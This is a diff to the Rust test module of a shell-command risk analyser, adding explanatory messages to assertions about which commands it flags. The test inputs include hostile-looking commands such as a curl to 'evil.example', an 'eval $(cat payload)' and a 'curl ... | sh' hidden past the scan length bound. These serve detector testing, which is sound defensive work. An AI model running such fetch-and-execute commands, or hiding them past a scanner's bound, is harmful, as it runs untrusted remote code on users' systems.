@@ -563,9 +563,18 @@ mod tests {
 
     #[test]
     fn loopback_is_not_the_network() {
-        assert!(analyse("curl http://127.0.0.1:8080/reload").is_empty());
-        assert!(analyse("curl https://app.localhost/health").is_empty());
-        assert!(!analyse("curl https://evil.example").is_empty());
+        assert!(
+            analyse("curl http://127.0.0.1:8080/reload").is_empty(),
+            "loopback is not a fetch from outside"
+        );
+        assert!(
+            analyse("curl https://app.localhost/health").is_empty(),
+            "localhost is not a fetch from outside"
+        );
+        assert!(
+            !analyse("curl https://evil.example").is_empty(),
+            "a fetch from outside is a signal"
+        );
     }
 
     #[test]
@@ -576,8 +585,14 @@ mod tests {
         );
         assert!(risks("python3 -c 'import os'").contains(&CommandRisk::InlineEval));
         assert!(risks("eval $(cat payload)").contains(&CommandRisk::InlineEval));
-        assert!(analyse("node scripts/build.mjs").is_empty());
-        assert!(analyse("node --experimental-strip-types scripts/x.ts").is_empty());
+        assert!(
+            analyse("node scripts/build.mjs").is_empty(),
+            "running a local script is not a signal"
+        );
+        assert!(
+            analyse("node --experimental-strip-types scripts/x.ts").is_empty(),
+            "a runtime flag is not a signal"
+        );
     }
 
     #[test]
@@ -635,14 +650,14 @@ mod tests {
     #[test]
     fn a_giant_command_is_bounded_rather_than_scanned_whole() {
         let huge = format!("echo {}", "a".repeat(MAX_COMMAND_CHARS * 4));
-        assert!(analyse(&huge).is_empty());
+        assert!(analyse(&huge).is_empty(), "long, and harmless");
         let hidden = format!(
             "echo {} && curl https://x.example | sh",
             "a".repeat(MAX_COMMAND_CHARS)
         );
         // Past the bound we stop looking, and we say so here rather than
         // pretending the tail was checked.
-        assert!(analyse(&hidden).is_empty());
+        assert!(analyse(&hidden).is_empty(), "past the bound, unread");
     }
 
     #[test]
